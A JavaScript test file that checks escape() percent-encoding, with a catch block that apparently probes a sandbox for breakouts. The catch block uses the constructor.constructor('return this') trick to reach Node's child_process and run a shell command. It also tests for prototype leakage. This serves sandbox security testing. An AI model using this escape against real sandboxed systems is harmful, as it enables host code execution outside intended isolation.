try {
    assert.sameValue(escape('\0\x01\x02\x03'), '%00%01%02%03', 'characters: \\x00\\x01\\x02\\x03');
    assert.sameValue(escape('!"#$%&\'()'), '%21%22%23%24%25%26%27%28%29', 'characters preceding "*": !"#$%&\'()');
    assert.sameValue(escape(','), '%2C', 'character between "+" and "-": ,');
    assert.sameValue(escape(':;<=>?'), '%3A%3B%3C%3D%3E%3F', 'characters between "9" and "@": :;<=>?');
    assert.sameValue(escape('[\\]^'), '%5B%5C%5D%5E', 'characters between "Z" and "_": [\\]^');
    assert.sameValue(escape('`'), '%60', 'character between "_" and "a": `');
    assert.sameValue(escape('{|}~\x7F\x80'), '%7B%7C%7D%7E%7F%80', 'characters following "z": {|}~\\x7f\\x80');
    assert.sameValue(escape('ýþÿ'), '%FD%FE%FF', '\\xfd\\xfe\\xff');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}